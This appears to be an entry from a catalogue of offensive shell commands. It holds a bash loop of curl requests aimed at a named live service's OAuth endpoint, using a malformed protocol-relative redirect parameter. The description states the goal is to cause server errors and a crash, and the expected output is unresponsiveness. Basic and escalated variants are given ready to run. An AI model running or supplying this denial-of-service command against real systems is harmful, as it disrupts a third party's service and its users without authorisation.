---
data: >-
  for i in {1..10}; do curl
  "https://app.respond.ly/_oauth/twitter/?requestTokenAndRedirect=//hackerone.com";
  done
tags:
  - oauth
  - dos
  - loop
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.124Z'
id: 08ae3e64-97bd-4d85-81e9-b3acdbd0f3fc
verified: false
validated: true
submitted: true
---
# curl-repeat-protocol-relative

## Command

```bash
for i in {1..10}; do curl "https://app.respond.ly/_oauth/twitter/?requestTokenAndRedirect=//hackerone.com"; done
```

## Description

A bash loop that repeatedly sends the malformed OAuth request to induce server errors and potential crash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Loop count | Number of iterations (e.g., {1..10}) | Yes |
| URL | Malformed endpoint URL | Yes |

## Examples

### Basic Usage

```bash
for i in {1..10}; do curl "https://app.respond.ly/_oauth/twitter/?requestTokenAndRedirect=//hackerone.com"; done
```

### Advanced Usage

```bash
for i in {1..20}; do curl -s "https://app.respond.ly/_oauth/twitter/?requestTokenAndRedirect=//hackerone.com" >> logs.txt; done
```

## Expected Output

Multiple error responses, escalating to server unresponsiveness after sufficient repetitions.

## Related

- [[commands/curl-test-protocol-relative-uri]]
